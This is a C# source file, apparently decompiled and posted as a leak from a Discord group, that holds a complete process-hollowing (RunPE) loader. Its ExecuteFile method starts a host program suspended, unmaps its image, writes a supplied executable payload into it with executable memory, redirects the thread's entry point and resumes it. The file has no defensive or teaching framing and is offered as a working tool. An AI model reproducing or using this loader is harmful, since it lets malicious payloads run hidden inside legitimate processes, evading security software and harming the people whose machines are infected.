using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace RefreshFN
{
    public static class Memory
    {
        [Obfuscation(Feature = "virtualization", Exclude = true)]
        private static IntPtr Align(IntPtr source, int alignment)
        {
            long num = source.ToInt64() + (long)(alignment - 1);
            return new IntPtr((long)alignment * (num / (long)alignment));
        }

        [Obfuscation(Feature = "virtualization", Exclude = true)]
        private static IntPtr Allocate(int size, int alignment)
        {
            return RefreshFN.Memory.Align(Marshal.AllocHGlobal(size + alignment / 2), alignment);
        }

        [DllImport("kernel32.dll", CharSet = CharSet.None, ExactSpelling = false)]
        private static extern bool CloseHandle(long handle);

        [DllImport("kernel32.dll", CharSet = CharSet.None, ExactSpelling = false)]
        private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, byte[] lpStartupInfo, byte[] lpProcessInformation);

        [DllImport("kernel32.dll", CharSet = CharSet.None, ExactSpelling = false)]
        private static extern bool GetThreadContext(long hThread, IntPtr lpContext);

        [Obfuscation(Feature = "virtualization", Exclude = true)]
        public static void ExecuteFile(byte[] payloadBuffer, string host, string args)
        {
            int num = Marshal.ReadInt32(payloadBuffer, 60);
            int num1 = Marshal.ReadInt32(payloadBuffer, num + 24 + 56);
            int num2 = Marshal.ReadInt32(payloadBuffer, num + 24 + 60);
            int num3 = Marshal.ReadInt32(payloadBuffer, num + 24 + 16);
            short num4 = Marshal.ReadInt16(payloadBuffer, num + 4 + 2);
            short num5 = Marshal.ReadInt16(payloadBuffer, num + 4 + 16);
            long num6 = Marshal.ReadInt64(payloadBuffer, num + 24 + 24);
            byte[] numArray = new byte[104];
            byte[] numArray1 = new byte[24];
            IntPtr intPtr = RefreshFN.Memory.Allocate(1232, 16);
            string str = host;
            if (!string.IsNullOrEmpty(args))
            {
                str = string.Concat(str, " ", args);
            }
            string currentDirectory = Directory.GetCurrentDirectory();
            Marshal.WriteInt32(intPtr, 48, 1048603);
            RefreshFN.Memory.CreateProcess(null, str, IntPtr.Zero, IntPtr.Zero, true, 4, IntPtr.Zero, currentDirectory, numArray, numArray1);
            long num7 = Marshal.ReadInt64(numArray1, 0);
            long num8 = Marshal.ReadInt64(numArray1, 8);
            RefreshFN.Memory.ZwUnmapViewOfSection(num7, num6);
            RefreshFN.Memory.VirtualAllocEx(num7, num6, (long)num1, 12288, 64);
            RefreshFN.Memory.WriteProcessMemory(num7, num6, payloadBuffer, num2, (long)0);
            for (short i = 0; i < num4; i = (short)(i + 1))
            {
                byte[] numArray2 = new byte[40];
                Buffer.BlockCopy(payloadBuffer, num + 24 + num5 + 40 * i, numArray2, 0, 40);
                int num9 = Marshal.ReadInt32(numArray2, 12);
                int num10 = Marshal.ReadInt32(numArray2, 16);
                int num11 = Marshal.ReadInt32(numArray2, 20);
                byte[] numArray3 = new byte[num10];
                Buffer.BlockCopy(payloadBuffer, num11, numArray3, 0, (int)numArray3.Length);
                RefreshFN.Memory.WriteProcessMemory(num7, num6 + (long)num9, numArray3, (int)numArray3.Length, (long)0);
            }
            RefreshFN.Memory.GetThreadContext(num8, intPtr);
            byte[] bytes = BitConverter.GetBytes(num6);
            long num12 = Marshal.ReadInt64(intPtr, 136);
            RefreshFN.Memory.WriteProcessMemory(num7, num12 + (long)16, bytes, 8, (long)0);
            Marshal.WriteInt64(intPtr, 128, num6 + (long)num3);
            RefreshFN.Memory.SetThreadContext(num8, intPtr);
            RefreshFN.Memory.ResumeThread(num8);
            Marshal.FreeHGlobal(intPtr);
            RefreshFN.Memory.CloseHandle(num7);
            RefreshFN.Memory.CloseHandle(num8);
        }

        [DllImport("kernel32.dll", CharSet = CharSet.None, ExactSpelling = false)]
        private static extern uint ResumeThread(long hThread);

        [DllImport("kernel32.dll", CharSet = CharSet.None, ExactSpelling = false)]
        private static extern bool SetThreadContext(long hThread, IntPtr lpContext);

        [DllImport("kernel32.dll", CharSet = CharSet.None, ExactSpelling = false)]
        private static extern long VirtualAllocEx(long hProcess, long lpAddress, long dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", CharSet = CharSet.None, ExactSpelling = false)]
        private static extern long WriteProcessMemory(long hProcess, long lpBaseAddress, byte[] lrpBuffer, int nSize, long written);

        [DllImport("ntdll.dll", CharSet = CharSet.None, ExactSpelling = false)]
        private static extern uint ZwUnmapViewOfSection(long ProcessHandle, long BaseAddress);
    }
}
//// LEAKED BY CIPHER - discord.gg/Xperience